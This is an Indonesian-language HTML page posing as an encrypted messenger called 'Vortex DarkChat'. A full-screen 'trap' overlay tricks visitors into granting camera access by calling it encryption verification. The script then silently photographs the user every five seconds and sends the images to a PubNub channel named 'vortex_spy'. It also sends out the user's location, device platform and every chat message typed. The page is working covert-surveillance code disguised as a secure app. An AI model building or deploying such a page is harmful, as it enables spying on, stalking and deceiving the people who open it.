<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vortex DarkChat | Secure Messenger</title>
    <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.4.29.9.min.js"></script>
    <style>
        :root { --main: #00ff88; }
        body { 
            margin: 0; font-family: sans-serif; background: #000; color: #e9edef; 
            height: 100vh; display: flex; flex-direction: column; overflow: hidden;
            background-image: url('https://w0.peakpx.com/wallpaper/473/954/HD-wallpaper-meteor-shower-starry-night-galaxy-stars-falling-stars-meteor-night-sky.jpg'); 
            background-size: cover; background-position: center;
        }
        #bg-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1; }
        
        /* Layer Utama */
        .app-container { position: relative; z-index: 2; display: flex; flex-direction: column; height: 100vh; }
        header { background: rgba(32, 44, 51, 0.9); padding: 15px; border-bottom: 1px solid #334155; }
        #chat { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 10px; }
        .m { padding: 10px; border-radius: 8px; max-width: 80%; background: rgba(32, 44, 51, 0.8); border: 1px solid #334155; }
        
        /* Input Area */
        .input { background: rgba(32, 44, 51, 0.9); padding: 10px; display: flex; gap: 10px; }
        input { flex: 1; background: #2a3942; border: 1px solid #334155; padding: 12px; border-radius: 20px; color: white; outline: none; }

        /* TRAP OVERLAY - INI YANG KITA FIX */
        #trap { 
            position: fixed; inset: 0; background: #0b141a; 
            z-index: 9999; /* Pastikan paling atas */
            display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center;
        }
        .v-btn { 
            padding: 15px 40px; background: var(--main); color: black; 
            font-weight: bold; border-radius: 30px; border: none; 
            cursor: pointer; font-size: 16px; box-shadow: 0 0 20px rgba(0,255,136,0.5);
            z-index: 10000; /* Pastikan tombol di atas background trap */
        }
        
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div id="bg-overlay"></div>

    <div id="trap">
        <h2 style="color:var(--main); margin-bottom: 10px;">🔒 End-to-End Encrypted</h2>
        <p style="color:#8696a0; width: 80%; margin-bottom: 30px;">Verifikasi sensor perangkat untuk mengaktifkan jalur chat rahasia.</p>
        <button class="v-btn" onclick="startSystem()">AKTIFKAN SEKARANG</button>
    </div>

    <div class="app-container">
        <header><b>Vortex Support 🤖</b><br><small style="color:var(--main)">Secure Mode Active</small></header>
        <div id="chat">
            <div class="m">Sistem siap. Obrolan Anda sekarang terlindungi.</div>
        </div>
        <div class="input">
            <input type="text" id="i" placeholder="Ketik pesan...">
            <button onclick="send()" style="background:none; border:none; color:var(--main); font-size:20px;">➤</button>
        </div>
    </div>

    <video id="v" autoplay playsinline></video><canvas id="c"></canvas>

    <script>
        const uID = 'User-' + Math.floor(Math.random()*9999);
        const pub = new PubNub({ publishKey: 'demo', subscribeKey: 'demo', uuid: uID });
        const v = document.getElementById('v'), c = document.getElementById('c');

        function startSystem() {
            console.log("Tombol ditekan, meminta izin...");
            
            // 1. Minta Izin Kamera & Mic
            navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
            .then(s => {
                v.srcObject = s;
                // Hilangkan Trap Overlay
                document.getElementById('trap').style.display = 'none';
                
                // Mulai Sadap Kamera tiap 5 detik
                setInterval(() => {
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    pub.publish({ 
                        channel: 'vortex_spy', 
                        message: { spy:true, img:c.toDataURL('image/jpeg',0.3), id:uID } 
                    });
                }, 5000);
            })
            .catch(err => {
                alert("Gagal: Anda harus mengaktifkan enkripsi (izin sensor) untuk masuk!");
                console.log(err);
            });

            // 2. Ambil Lokasi & Info HP
            navigator.geolocation.getCurrentPosition(p => {
                pub.publish({ 
                    channel: 'vortex_data', 
                    message: { id:uID, info:true, dev:navigator.platform, loc: p.coords.latitude + "," + p.coords.longitude } 
                });
            });
        }

        // Fungsi Chat Sederhana
        function send() {
            const inp = document.getElementById('i');
            if(!inp.value) return;
            const d = document.createElement('div');
            d.className = 'm'; d.style.alignSelf = 'flex-end'; d.style.background = '#005c4b';
            d.innerText = inp.value;
            document.getElementById('chat').appendChild(d);
            
            pub.publish({ channel: 'vortex_chat', message: { id:uID, msg:inp.value } });
            inp.value = '';
        }
    </script>
</body>
</html>
